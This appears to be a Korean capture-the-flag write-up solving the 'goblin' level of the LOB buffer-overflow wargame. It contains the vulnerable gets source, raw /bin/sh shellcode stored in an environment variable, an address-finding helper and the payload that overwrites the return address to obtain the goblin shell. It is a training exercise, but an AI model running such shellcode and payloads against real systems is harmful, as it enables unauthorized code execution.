============================================================================================================
[redhat-lob] (3) goblin
============================================================================================================


.. graphviz::

    digraph foo {
        a -> b -> c -> d -> e;

        a [shape=box, label="dummy * 20 + envp address"];
        b [shape=box, color=lightblue, label="gets"];
        c [shape=box, label="Buffer Overflow"];
        d [shape=box, label="envp address"];
        e [shape=box, label="dummy * 100 + shellcode"];
    }


|

Source Code
============================================================================================================

.. code-block:: c

    int main()
    {
        char buffer[16];
        gets(buffer);
        printf("%s\n", buffer);
    }


|


Vulnerabliity Vector
============================================================================================================

main 함수의 ret를 덮어씌워 오버플로우를 발생시킨다.

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of main
    saved registers of main
    return address of main <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)    
    ==============================

|


Buffer Overflow
============================================================================================================


.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2
    $ ./goblin
    aaaaaaaaaaaaaaaa

    aaaaaaaaaaaaaaaa

    $ ./goblin
    aaaaaaaaaaaaaaaaaaaa

    aaaaaaaaaaaaaaaaaaaa
    Segmentation fault

|

exploit
============================================================================================================

환경 변수 상에 쉘코드 등록
------------------------------------------------------------------------------------------------------------

환경 변수에 쉘코드를 등록해두고, 입력값 마지막 리턴 주소를 환경 변수 주소로 변경하여 해당 쉘코드를 실행하도록 한다.

.. code-block:: console

    $ export shellcode=`python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

|

환경 변수 주소값 확인
------------------------------------------------------------------------------------------------------------

다음과 같이 소스코드를 작성하여 shellcode 환경 변수에 대한 주소 값을 획득.

.. code-block:: c

    #include <stdio.h>
    int main(int argc, char **argv)
    {
            char *addr;
            addr = getenv(argv[1]);
            printf("address %p\n", addr);
            return 0;
    }

.. code-block:: console

    $ gcc -o get get.c

    get.c: In function `main':
    get.c:6: warning: assignment makes pointer from integer without a cast

    $ ./get shellcode

    address 0xbfffff02

|

환경 변수 주소 쉘코드 실행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of main
    saved registers of main
    return address of main <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers
    NULL that ends argv[]
    environment pointers ->> shellcode
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)    
    ==============================

|


오버플로우시 RET를 환경 변수 주소로 덮어씌워 해당 쉘코드가 실행되도록 한다. 

gets의 경우 프로그램 실행 이후 값이 입력되어야 하기 때문에 다음 형식으로 변수를 입력합니다.

.. code-block:: console

    $ (python -c 'print "a"*20+"\x01\xff\xff\xbf"';cat) |./goblin
    aaaaaaaaaaaaaaaaaaaa▒▒▒

    whoami
    goblin
    my-pass
    euid = 503
    hackers proof

